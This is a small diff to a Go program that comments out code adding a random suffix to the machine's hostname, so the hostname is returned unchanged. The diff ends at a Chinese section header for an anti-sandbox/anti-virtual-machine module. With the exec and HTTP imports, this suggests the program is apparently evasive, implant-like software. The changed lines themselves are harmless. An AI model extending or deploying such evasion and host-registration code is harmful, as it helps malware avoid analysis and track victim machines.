@@ -12,7 +12,7 @@ import (
 	"image/png"
 	"io"
 	"net/http"
-	"math/big"
+	//"math/big"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -57,14 +57,14 @@ func getHostname() string {
 	
 	// 2. 生成 4 位随机后缀 (防止克隆机重名)
 	// 使用 crypto/rand 生成真随机数
-	const letters = "0123456789abcdef"
-	suffix := make([]byte, 4)
-	for i := 0; i < 4; i++ {
-		num, _ := rand.Int(rand.Reader, big.NewInt(int64(len(letters))))
-		suffix[i] = letters[num.Int64()]
-	}
+	//const letters = "0123456789abcdef"
+	//suffix := make([]byte, 4)
+	//for i := 0; i < 4; i++ {
+	//	num, _ := rand.Int(rand.Reader, big.NewInt(int64(len(letters))))
+	//	suffix[i] = letters[num.Int64()]
+	//}
 
-	return fmt.Sprintf("%s-%s", name, string(suffix))
+	return fmt.Sprintf("%s", name)
 }
 
 // --- 模块 1: 反沙箱/反虚拟机 ---
